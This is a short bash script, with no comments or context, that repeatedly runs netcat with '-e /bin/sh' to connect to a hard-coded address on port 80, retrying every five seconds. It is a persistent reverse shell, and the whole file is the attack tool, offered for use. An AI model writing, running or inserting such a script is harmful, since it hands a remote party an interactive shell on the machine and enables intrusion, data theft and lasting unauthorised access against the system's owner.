#!/bin/bash

host="192.168.1.1"
port=80

while true; do
    nc -e /bin/sh $host $port
    if [ $? -eq 0 ]; then
        echo "Connected!"
    else
        echo "Reconnecting in 5 Second ..."
        sleep 5
    fi
done
